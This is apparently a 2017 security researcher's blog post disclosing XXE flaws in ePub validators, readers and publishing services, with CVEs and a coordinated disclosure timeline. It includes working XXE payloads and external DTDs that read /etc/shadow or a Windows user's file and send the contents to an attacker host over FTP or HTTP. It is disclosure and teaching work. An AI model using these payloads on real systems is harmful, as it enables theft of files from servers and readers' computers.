---
layout: post
title:  "This book reads you - exploiting services and readers that support the ePub book format"
date:   2017-01-25 12:00:00
categories: epub
---

> "We use the ePub format - it is the most popular open book format in the world. We’re very excited about this." - Steve Jobs, 2010 (original iPad launch)

TLDR; Applying a familiar XXE pattern to exploit services & readers that consume the ePUB format. Exploiting vulnerabilities in **EpubCheck <= 4.0.1** (ePub Validation Java Library & tool), **Adobe Digital Editions <= 4.5.2** (book reader), **Amazon KDP** (Kindle Publishing Online Service), **Apple Transporter**, and **Google Play Book uploads**, etc.

ePub is a standard format for open books maintained by [IDPF](http://www.idpf.org/) (International Digital Publishing Forum). IDPF is a trade and standards association for the digital publishing industry, set up to establish a standard for ebook publishing. Their membership list: [http://idpf.org/membership/members](http://idpf.org/membership/members)

An epub is based on XML, CSS, XHTML, etc web content zipped together into a single package, which ends in the extension .epub. Depending on the reader device/application support, [ePub](http://www.idpf.org/epub/30/spec/epub30-changes.html#sec-new-changed) can also support interactivity using Flash and Javascript.

ePub uses XML metadata to define the document structure, support digital signatures, digital rights (DRM) etc.

eg., epub archive:
{% highlight javascript %}
Archive:  book.epub
  Length      Date    Time    Name
---------  ---------- -----   ----
       20  04-09-2014 15:41   mimetype
     2189  04-09-2014 15:41   toc.ncx
    39962  04-09-2014 15:41   OEBPS/chapter-001-chapter-i.html
    41745  04-09-2014 15:41   OEBPS/chapter-002-chapter-ii.html
      684  04-09-2014 15:41   OEBPS/title-page.html
      557  04-09-2014 15:41   OEBPS/front-cover.html
    42220  04-09-2014 15:41   OEBPS/chapter-003-chapter-iii.html
     1185  04-09-2014 15:41   OEBPS/copyright.html
      884  04-09-2014 15:41   OEBPS/table-of-contents.html
   234790  04-09-2014 15:41   OEBPS/assets/pressbooks-promo.png
    33684  04-09-2014 15:41   OEBPS/assets/MedulaOne-Regular.ttf
   244146  04-09-2014 15:41   OEBPS/assets/themetamorphosis_1200x1600.jpg
      661  04-09-2014 15:41   OEBPS/pressbooks-promo.html
    27328  04-09-2014 15:41   OEBPS/jackson.css
     3494  04-09-2014 15:41   book.opf
      240  04-09-2014 15:41   META-INF/container.xml
      157  04-09-2014 15:41   META-INF/com.apple.ibooks.display-options.xml
---------                     -------
   673946                     17 files
{% endhighlight %}

eg., contents of META-INF/container.xml
{% highlight xml %}
<?xml version="1.0"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
 <rootfiles>
 <rootfile full-path="OEBPS/book.opf"
 media-type="application/oebps-package+xml" />
 </rootfiles>
</container>
{% endhighlight %}

eg., contents of book.opf
{% highlight xml %}
<?xml version="1.0" encoding="UTF-8" ?>
    <package version="2.0" xmlns="http://www.idpf.org/2007/opf" unique-identifier="PrimaryID">
    <metadata xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf">
    <dc:title>My Book </dc:title>
    <dc:language>en</dc:language>
    <dc:identifier id="PrimaryID" opf:scheme="URI">http://mybook.com</dc:identifier>
    <dc:description>Description</dc:description>
    <dc:creator opf:role="aut">Author</dc:creator>
    <dc:publisher>Publisher.com</dc:publisher>
    <meta name="cover" content="cover-image" />
</metadata>
{% endhighlight %}

When I first started looking into this, I learned about a tool/Java library called [EpubCheck](https://github.com/IDPF/epubcheck/releases) (provided by IDPF) that is used to validate books in the ePub format. Book publishers tend to perform a validation step using something like this to check the format validity. The validator tool/library was vulnerable to XXE, so any application that relies on a vulnerable version to check the validity of a book would be susceptible to this type of attack. 

#### Modifying an existing ePub file to test for XML parsing vulnerabilities:

* __curl https://s3-us-west-2.amazonaws.com/pressbooks-samplefiles/MetamorphosisJacksonTheme/Metamorphosis-jackson.epub -o book.epub__

* __unzip book.epub; rm book.epub__

* __Edit any of the files that contain XML metadata.__ 

eg., book.opf  (XXE - XML External Entities pattern)
{% highlight xml %}
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE a [<!ENTITY % b SYSTEM "http://123.123.123.123/dtd">%b;%c;]><package version="2.0" xmlns="http://www.idpf.org/2007/opf" unique-identifier="PrimaryID">
<metadata xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:opf="http://www.idpf.org/2007/opf">
<dc:title>Metamorphosis</dc:title>
<dc:language>en</dc:language>
<dc:identifier id="PrimaryID" opf:scheme="URI">http://metamorphosiskafka.pressbooks.com</dc:identifier>
<dc:description>&send;</dc:description>
{% endhighlight %}

* __zip -r book.epub *__

* __Point at a HTTP server to serve the following contents, and specifying a FTP server to recieve the specified file__

{% highlight xml %}
<!ENTITY % d SYSTEM "file:///etc/shadow">
<!ENTITY % c "<!ENTITY send SYSTEM 'ftp://123.123.123.123/%d;'>">
{% endhighlight %}

**EpubCheck <= 4.0.1** 

There was a online instance of EpubCheck, that would accept user uploads and perform validation on the format. This provides an example of how this vulnerability could be used to attack online services that support ePub in some way, if they are using a vulnerable version of EpubCheck to validate the uploaded file. 

Uploading our created file:
![Image](/assets/epub/upload.png)

HTTP listener receiving the dtd request when parsed by the remote XML parser, and custom FTP listener receiving the file (I didn't think it would work, but specified /etc/shadow as the file to retrieve).  
![Image](/assets/epub/EPubCheck.png)

This means that we accidentally retrieved the /etc/shadow file. Public facing web apps running as root/system in prod... 😫

A few examples of other services, and applications I came across that were vulnerable:

**Amazon KDP** which allows publishers to upload books, was susceptible to XXE when converting books to the Kindle format. 
![Image](/assets/epub/AMZ1.png)
![Image](/assets/epub/AMZ2.png)

**[Adobe Digital Editions](http://www.adobe.com/solutions/ebook/digital-editions.html) <= 4.5.2** (book reader) when a user opens a book, this would allow files to be taken from their system. [CVE-2016-7889](https://helpx.adobe.com/security/products/Digital-Editions/apsb16-45.html).

External DTD specifying the file to retrive:

{% highlight xml %}
<!ENTITY % d SYSTEM "file:///c:/Users/Documents/secret.txt">
<!ENTITY % c "<!ENTITY send SYSTEM 'http://123.123.123.123/exfil/%d;'>">
{% endhighlight %}

eg., Retrieving secret stuff from a users Windows documents folder:
![Image](/assets/epub/ADE.png)

**Apple Transporter** (underlying tool used to validate metadata and assets and deliver them to the iTunes Store), [CVE-2016-7666](https://support.apple.com/en-us/HT207432).
![Image](/assets/epub/Transporter.png)

**[Google Play Book uploads](https://play.google.com/books/uploads)** did not allow external entity processing, but was vulnerable to XML exponential entity expansion [billion laughs](https://cwe.mitre.org/data/definitions/776.html). When uploading a ePub with this pattern, it would spend about 45 minutes trying to process the file before returning an error condition. Google confirmed this on their side.

There are more things going on with the ePub format beyond the familiar patterns shown here. Some applications will allow Flash to be run, and Javascript execution in the context of the book reader, so you can imagine this can be used to perform some attacks; currently waiting on vendor fixes before talking about this. 

Disclosure timeline stuff:

* Sep 2016: Reported XXE in EpubCheck <= 4.0.1.
* Sep 2016: Reported XXE in Adobe Digital Editions <= 4.5.2.
* Sep 2016: Reported XXE in Amazon KDP.
* Oct 2016: Reported XXE in Apple Transporter
* Oct 2016: Reported XML exponential entity expansion in play.google.com book uploads.
* Dec 2016: Coordinated disclosure.
* Jan 2017: This blog post (lots of time for users to patch).

Thanks to [CERT/CC](http://www.cert.org/) for their help in coordinating with different vendors & IDPF, and setting a disclosure timeline. I only tested a handful of digital readers and services, so if you find other vulnerable readers/services, tell CERT/CC (they were tracking the ePubCheck issue as VU#779243).

If you got this far, thanks for reading. 👋 

[@craig](https://twitter.com/signalchaos)

